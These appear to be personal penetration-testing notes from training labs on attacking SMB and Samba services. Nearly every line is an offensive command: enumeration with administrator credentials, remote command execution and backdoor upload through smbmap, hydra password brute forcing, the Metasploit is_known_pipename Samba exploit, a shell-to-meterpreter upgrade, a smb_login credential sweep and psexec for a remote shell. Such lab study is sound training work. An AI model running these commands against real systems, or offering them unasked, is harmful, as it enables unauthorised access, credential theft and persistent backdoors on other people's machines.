## SMB 
+ Try to run the nmap to get the target host ip
- `nmap -T4 10.5.27.0/20 -o nmap.txt`
- 'nmap -Pn -A -sC -T4 10.5.19.82 -o nmap.txt` ---> Port scan on target ip
- `net use * /delete` ---> It delete smb local connection
- `net use z: \\10.5.19.82\c$ smbserver_771 /user:administrator`
- `nmap -p 445 --script smb-protocols 10.0.1.22`
- `nmap -p 445 --script smb-security-mode 10.0.1.22`
- `nmap -p 445 --script smb-enum-seesions 10.0.1.22`
- `nmap -p 445 --script smb-enum-seesions --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-shares --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-users --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-server-stats --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-* --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
### SMBMap
- `smbmap -u guest -p "" -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -x "ipconfig"`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -L`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -r 'C$'` ---> reads the content of the 'C' drive
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --upload '/root/backdoor' 'C$\backdoor'`
  - `--upload '/root/backdoor'`---> upload the backdoor file 
  - `'C$\backdoor'`  ---> giving the path to where to upload the backdoor file in target system 
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --download "C$\flag.txt"`
- 
## Samba

#### Metasploit
* To find the smb version we can use metasploit also
- `msfconsole`
- `user auxiliary/scanner/smb/smb_version`
- `show options`
- `set rhosts <target_ip>`
- `run` or `exploit`

### nmblookup
- `nmblookup -A 10.0.1.22`
  - If you get the result `SAMBA-RECON  <20>`
  - That means there is a server running
  - so using `smbclient` we can connect to the server
  
#### smbclient
- `smbclient -L 10.0.1.22 -N`
- `rpcclient -U "" -N 10.0.1.22`

### Samba 2
- `rpcclient -U "" -N 10.0.1.22`
  - `enumdomusers`
  - `lookupnames admin`
  - `srvinfo`
- `enum4linux -o 10.0.1.22`
- `enum4linux -U 10.0.1.22`
- `smbclient -L 10.0.1.22 -N`
- `msfconsole`
- `use auxiliary/scanner/smb/smb2`
- `set RHOSTS 10.0.1.22`
- `exploit`










# exploiting using metasploit framework
- __`search type:exploit name:samba`__
- __`search pipename`__
```
use exploit/Linux/samba/is_know_pipename
exploit
```
ctr+z
upgrading to meterpreter session
```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST ech1
set session 1
exploit
```

# Exploiting SAMBA


__1. Brup force attack on SAMBA__
- __`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 smb`__

__2. smbmap__
__`smbmap -H demo.ine.local -u admin -p password1`__
  - __It will display the user's and  permissions__

__3.smbclient__
__`smbclient //demo.ine.local/shawn -U admin`__
  - __it will connect the server like a ftp__
  - __`shawn` is a user__
  - __`-U admin` authenticate as a admin mean you can login using admin logs__

__4. enum4linux__
__`enum4linux -a -u admin -p password1`__

- __1. Target information__
- __2. Users__
- __3. SID of the users__












# SMB (Server Message Block) - 445 TCP, 139 on NetBIOS
  - __used for network file sharing, printer__
  - __SAMBA is the open source linux implementation of SMB__
- __1. We will run smb_login module to find all the valid users and their passwords.__
```
service postgresql start && msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit
```
## We have found four valid users and their passwords
- __2.Running psexec module to gain the meterpreter shell..__
```
service postgresql start && msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```

